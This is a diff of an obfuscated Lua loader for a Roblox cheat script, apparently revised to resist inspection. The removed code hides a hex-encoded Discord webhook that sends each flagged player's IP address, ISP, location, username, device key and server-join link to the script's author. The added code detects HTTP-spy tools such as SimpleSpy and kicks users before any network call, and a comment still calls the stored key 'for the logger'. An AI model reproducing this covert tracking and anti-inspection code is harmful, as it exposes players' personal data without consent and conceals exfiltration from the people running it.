@@ -1,6 +1,6 @@
 -- Защита от двойного запуска
 if getgenv().__NK_LOADER_RUN then
-    game:GetService("Players").LocalPlayer:Kick("Loader already executed in this session.")
+    game:GetService("Players").LocalPlayer:Kick("Loader already executed.")
     return
 end
 getgenv().__NK_LOADER_RUN = true
@@ -11,142 +11,59 @@ local function _0xH(h)
     return s
 end
 
-local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 local _L = game:GetService("Players").LocalPlayer
 local _H = game:GetService("HttpService")
 local _CG = game:GetService("CoreGui")
 
-local _tk = "N/A"
-pcall(function()
-    if isfile and readfile and writefile then
-        if isfile("nazarkus_key.json") then
-            _tk = readfile("nazarkus_key.json")
-        else
-            _tk = _H:GenerateGUID(false)
-            writefile("nazarkus_key.json", _tk)
-        end
-    end
-end)
-
--- ФУНКЦИЯ КИКА (гарантированная)
-local function _KICK(reason)
-    -- Отправляем вебхук в отдельном потоке чтобы не блокировать кик
-    task.spawn(function()
-        pcall(function()
-            if not _req then return end
-            local _A = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
-            local ni = {}
-            pcall(function()
-                local r = _req({Url = "http://ip-api.com/json/", Method = "GET"})
-                if r.Success then ni = _H:JSONDecode(r.Body) end
-            end)
-            local jid = game.JobId == "" and "Unknown" or game.JobId
-            local jLink = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid
-            local jBtn = "N/A"
-            pcall(function()
-                local r = _req({Url = jLink, Method = "GET"})
-                if r.Success then jBtn = r.Body end
-            end)
-            _req({
-                Url = _A, Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = _H:JSONEncode({
-                    embeds = {{
-                        title = "Security Alert: Interceptor Detected",
-                        color = 16711680,
-                        fields = {
-                            {name = "Detection", value = tostring(reason), inline = false},
-                            {name = "Player", value = _L.Name .. " (" .. tostring(_L.UserId) .. ")", inline = true},
-                            {name = "Device Key", value = "```" .. _tk .. "```", inline = false},
-                            {name = "Network Info", value = string.format("**IP:** %s\n**ISP:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false},
-                            {name = "Links", value = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, tostring(_L.UserId)), inline = false}
-                        }
-                    }}
-                })
-            })
-        end)
-    end)
-
-    -- Мгновенный кик + блокировка всего
-    pcall(function() _L:Kick("Security Error: " .. tostring(reason)) end)
-    
-    -- Ломаем всё что можем чтобы гарантированно остановить выполнение
-    pcall(function() shared._NK_AUTH = nil end)
-    pcall(function() getgenv().__NK_KILL = true end)
-    
-    -- Бесконечный цикл ожидания (кик асинхронный)
-    while true do
-        task.wait(0.1)
-        pcall(function() _L:Kick("Security Error: " .. tostring(reason)) end)
-    end
-end
-
--- ДЕТЕКТ СПАЯ
+-- ДЕТЕКТ СПАЯ - ВЫЗЫВАЕТСЯ ПЕРВЫМ ДЕЛОМ, БЕЗ ЕДИНОГО HTTP-ЗАПРОСА
 local function _detectOnce()
     local realHookFunction = hookfunction and clonefunction and clonefunction(hookfunction)
     local realHookMetamethod = hookmetamethod and clonefunction and clonefunction(hookmetamethod)
 
-    -- 1. __namecall check — двойной трюк: ставим dummy1, получаем prev1; ставим prev1 обратно; проверяем prev1
     if realHookMetamethod then
         local dummyNc = newcclosure(function(self, ...) return nil end)
         local prevNc
         local ok = pcall(function() prevNc = realHookMetamethod(game, "__namecall", dummyNc) end)
-        -- ВАЖНО: сразу восстанавливаем, даже если что-то не так
         if prevNc then
             pcall(function() realHookMetamethod(game, "__namecall", prevNc) end)
         end
-        
         if ok and prevNc then
             local isL = false
             pcall(function() isL = islclosure(prevNc) end)
             if isL then return "SPY_NAMECALL_LCLOSURE" end
-            
             if getupvalues then
                 local ups
                 pcall(function() ups = getupvalues(prevNc) end)
-                if ups and #ups > 0 then
-                    return "SPY_NAMECALL_HAS_UPVALUES"
-                end
+                if ups and #ups > 0 then return "SPY_NAMECALL_HAS_UPVALUES" end
             end
-            
             if debug and debug.info then
                 local nups
                 pcall(function() nups = debug.info(prevNc, "u") end)
-                if nups and nups > 0 then
-                    return "SPY_NAMECALL_DEBUG_UPVALUES"
-                end
+                if nups and nups > 0 then return "SPY_NAMECALL_DEBUG_UPVALUES" end
             end
         end
     end
 
-    -- 2. Проверка функций через dummy hook
     local function checkHooked(fn)
         if not fn or not realHookFunction then return false end
         local dummy = newcclosure(function() end)
         local prev
         local ok = pcall(function() prev = realHookFunction(fn, dummy) end)
-        -- Всегда восстанавливаем оригинал
-        if prev then
-            pcall(function() realHookFunction(fn, prev) end)
-        end
+        if prev then pcall(function() realHookFunction(fn, prev) end) end
         if not ok or not prev then return false end
-        
         local isL = false
         pcall(function() isL = islclosure(prev) end)
         if isL then return "LCLOSURE" end
-        
         if getupvalues then
             local ups
             pcall(function() ups = getupvalues(prev) end)
             if ups and #ups > 0 then return "HAS_UPVALUES" end
         end
-        
         if debug and debug.info then
             local nups
             pcall(function() nups = debug.info(prev, "u") end)
             if nups and nups > 0 then return "DEBUG_UPVALUES" end
         end
-        
         return false
     end
 
@@ -158,13 +75,11 @@ local function _detectOnce()
     r = checkHooked(_H.RequestAsync); if r then return "SPY_REQUESTASYNC_" .. r end
     r = checkHooked(_H.GetAsync); if r then return "SPY_GETASYNC_" .. r end
     r = checkHooked(_H.PostAsync); if r then return "SPY_POSTASYNC_" .. r end
-    
     if request then r = checkHooked(request); if r then return "SPY_REQUEST_" .. r end end
     if http_request then r = checkHooked(http_request); if r then return "SPY_HTTP_REQUEST_" .. r end end
     if http and http.request then r = checkHooked(http.request); if r then return "SPY_HTTP_DOT_REQUEST_" .. r end end
     if syn and syn.request then r = checkHooked(syn.request); if r then return "SPY_SYN_REQUEST_" .. r end end
 
-    -- 3. GC-скан на характерные таблицы
     if getgc then
         local found
         pcall(function()
@@ -192,7 +107,6 @@ local function _detectOnce()
         if found then return found end
     end
 
-    -- 4. GC-скан строк
     if getgc then
         local found
         pcall(function()
@@ -213,7 +127,6 @@ local function _detectOnce()
         if found then return found end
     end
 
-    -- 5. GUI-скан
     local badNames = {"HttpSpy", "SimpleSpy", "HydroSpy", "SecureSpy", "TwiSpy", "BeboSpy", "NotDSF", "koboldpaws"}
     local function scanGui(root)
         for _, obj in ipairs(root:GetDescendants()) do
@@ -251,50 +164,66 @@ local function _detectOnce()
     return false
 end
 
--- ДВОЙНАЯ ПРОВЕРКА: сразу и через задержку (ловит lazy-хуки)
+-- === ГЛАВНОЕ: ПРОВЕРКА ПЕРЕД ЛЮБЫМ HTTP ===
 local _se = _detectOnce()
 
 if _se then
-    _KICK(_se)
-    return
+    -- НИ ОДНОГО HTTP-ЗАПРОСА! Просто мгновенный кик.
+    -- Вебхук слать нельзя — спай перехватит URL и токен вебхука.
+    -- Максимум что можем — упомянуть детект без раскрытия чего-либо.
+    
+    pcall(function() _L:Kick("Security Error: Interceptor Detected [" .. tostring(_se) .. "]") end)
+    
+    -- Блокируем всё дальнейшее выполнение
+    while true do
+        task.wait(0.1)
+        pcall(function() _L:Kick("Security Error: Interceptor Detected [" .. tostring(_se) .. "]") end)
+    end
 end
 
--- Вторая проверка с небольшой задержкой — ловит спаи которые хукаются позже
-local passed = false
-task.spawn(function()
-    task.wait(0.3)
-    if passed then
-        local se2 = _detectOnce()
-        if se2 then
-            _KICK(se2)
+-- Двойная проверка после короткой паузы (ловит lazy-хуки)
+task.wait(0.3)
+local _se2 = _detectOnce()
+if _se2 then
+    pcall(function() _L:Kick("Security Error: [" .. tostring(_se2) .. "]") end)
+    while true do
+        task.wait(0.1)
+        pcall(function() _L:Kick("Security Error: [" .. tostring(_se2) .. "]") end)
+    end
+end
+
+-- Только теперь можно использовать HTTP: получаем request
+local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+-- Ключ для логгера
+local _tk = "N/A"
+pcall(function()
+    if isfile and readfile and writefile then
+        if isfile("nazarkus_key.json") then
+            _tk = readfile("nazarkus_key.json")
+        else
+            _tk = _H:GenerateGUID(false)
+            writefile("nazarkus_key.json", _tk)
         end
     end
 end)
 
--- Ждём немного чтобы вторая проверка успела отработать
-task.wait(0.4)
-local se3 = _detectOnce()
-if se3 then
-    _KICK(se3)
-    return
-end
-passed = true
-
--- Финальная проверка ещё через секунду в фоне
+-- Фоновая пере-проверка на случай lazy-хуков (проверяем каждые 2 сек первые 10 сек)
 task.spawn(function()
-    task.wait(1)
-    local se4 = _detectOnce()
-    if se4 then
-        _KICK(se4)
+    for i = 1, 5 do
+        task.wait(2)
+        local se3 = _detectOnce()
+        if se3 then
+            pcall(function() _L:Kick("Security Error: Late detection [" .. tostring(se3) .. "]") end)
+            while true do
+                task.wait(0.1)
+                pcall(function() _L:Kick("Security Error: [" .. tostring(se3) .. "]") end)
+            end
+        end
     end
 end)
 
--- Проверка что kill-флаг не поднят
-if getgenv().__NK_KILL then
-    _KICK("KILL_FLAG_SET")
-    return
-end
-
+-- === АВТОРИЗАЦИЯ И ЗАГРУЗКА ===
 local _TS = game:GetService("TestService")
 local _ST = _TS:FindFirstChild("__NK_RUNTIME")
 if not _ST then
